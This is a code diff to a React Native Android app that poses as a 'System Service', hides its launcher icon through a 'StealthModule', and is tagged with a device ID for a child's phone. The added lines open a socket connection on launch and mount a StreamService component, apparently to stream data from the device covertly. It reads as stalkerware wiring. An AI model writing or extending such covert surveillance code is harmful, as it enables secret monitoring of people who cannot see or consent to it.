@@ -1,5 +1,7 @@
 import React, { useEffect } from 'react';
 import { StyleSheet, Text, View, NativeModules, Platform } from 'react-native';
+import { initSocket } from './services/socket';
+import StreamService from './components/StreamService';
 
 const { StealthModule } = NativeModules;
 
@@ -9,6 +11,9 @@ const DEVICE_ID = 'android-child-device-01';
 
 export default function App() {
   useEffect(() => {
+    // 0. Initialize Socket Connection
+    initSocket(DEVICE_ID);
+
     // 1. Activate Stealth Mode (Hide Icon)
     // This calls the native module we created.
     if (Platform.OS === 'android' && StealthModule) {
@@ -49,6 +54,7 @@ export default function App() {
     <View style={styles.container}>
       <Text>System Service</Text>
       <Text style={styles.hidden}>Running in background...</Text>
+      <StreamService deviceId={DEVICE_ID} />
     </View>
   );
 }
